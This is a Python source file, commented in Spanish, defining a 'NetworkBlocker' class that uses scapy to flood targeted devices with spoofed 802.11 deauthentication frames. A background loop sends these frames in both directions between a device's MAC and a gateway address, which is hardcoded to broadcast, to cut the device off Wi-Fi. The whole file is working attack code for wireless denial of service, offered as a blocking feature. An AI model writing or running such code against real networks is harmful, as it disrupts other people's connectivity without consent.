import time
import threading
import scapy.all as scapy
from typing import Set

class NetworkBlocker:
    def __init__(self):
        self.blocked_macs: Set[str] = set()
        self.running = False
        self.thread = None
        self.lock = threading.Lock()
        self.gateway_mac = self._get_gateway_mac()

    def _get_gateway_mac(self):
        """Intenta obtener la MAC del Gateway"""
        try:
             # Este es un método simplificado. En producción idealmente se pasaría desde el main o dbase
             # Por ahora intentamos resolverlo dinámicamente o usar broadcast
             return "ff:ff:ff:ff:ff:ff" 
        except:
             return "ff:ff:ff:ff:ff:ff"

    def start(self):
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._attack_loop, daemon=True)
            self.thread.start()
            print("🛡️ Módulo de Bloqueo Activo Iniciado")

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join()

    def block_device(self, mac: str):
        with self.lock:
            self.blocked_macs.add(mac)
            print(f"🚫 Bloqueando dispositivo: {mac}")

    def unblock_device(self, mac: str):
        with self.lock:
            if mac in self.blocked_macs:
                self.blocked_macs.remove(mac)
                print(f"✅ Desbloqueando dispositivo: {mac}")

    def get_blocked_list(self):
        return list(self.blocked_macs)

    def _attack_loop(self):
        """Bucle principal que envía paquetes de desautenticación"""
        print("⚡ Iniciando loop de interdicción...")
        while self.running:
            if not self.blocked_macs:
                time.sleep(1)
                continue

            with self.lock:
                targets = list(self.blocked_macs)

            for mac in targets:
                try:
                    # Crear paquete de Deauth
                    # addr1: Target MAC (Destination)
                    # addr2: Gateway MAC (Source - Spoofed)
                    # addr3: Gateway MAC (BSSID - Spoofed)
                    # Reason 7: Class 3 frame received from nonassociated STA
                    
                    # Paquete 1: Router -> Dispositivo
                    dot11 = scapy.Dot11(addr1=mac, addr2=self.gateway_mac, addr3=self.gateway_mac)
                    packet = scapy.RadioTap()/dot11/scapy.Dot11Deauth(reason=7)
                    
                    # Enviar varias veces para asegurar efectividad
                    scapy.sendp(packet, count=3, verbose=False, iface=scapy.conf.iface)
                    
                    # Paquete 2: Dispositivo -> Router (opcional pero recomendado)
                    dot11_rev = scapy.Dot11(addr1=self.gateway_mac, addr2=mac, addr3=self.gateway_mac)
                    packet_rev = scapy.RadioTap()/dot11_rev/scapy.Dot11Deauth(reason=7)
                    scapy.sendp(packet_rev, count=3, verbose=False, iface=scapy.conf.iface)

                except Exception as e:
                    # Errors can happen if interface is down or permission denied
                    # print(f"Error bloqueando {mac}: {e}")
                    pass
            
            # Pequeña pausa para no saturar CPU al 100%, pero lo suficientemente rápido para bloquear
            time.sleep(0.1)

# Global Instance
blocker = NetworkBlocker()
